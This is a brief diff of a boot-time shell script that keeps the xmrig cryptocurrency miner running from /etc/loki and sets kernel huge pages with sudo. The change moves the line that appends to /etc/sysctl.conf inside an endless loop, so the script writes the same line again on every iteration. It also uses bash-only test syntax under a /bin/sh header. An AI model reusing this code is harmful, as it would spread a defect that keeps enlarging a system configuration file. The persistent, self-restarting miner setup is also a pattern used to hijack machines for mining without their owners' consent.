@@ -1,11 +1,11 @@
 #!/bin/sh
 #mv autorun.bash to /etc/init.d/ #update-rc.d autorun.bash defaults
 # run it$ bash autorun.bash & disown
-sudo sysctl -w vm.nr_hugepages=1280
-sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
 timeout=7200
 while true
 do
+sudo sysctl -w vm.nr_hugepages=1280
+sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
 #iip=$(dig +short myip.opendns.com @resolver1.opendns.com | sed -e "s/[.]/-/g")
 if [[ ! $(pgrep xmrig) ]]; then
 cd /etc/loki/
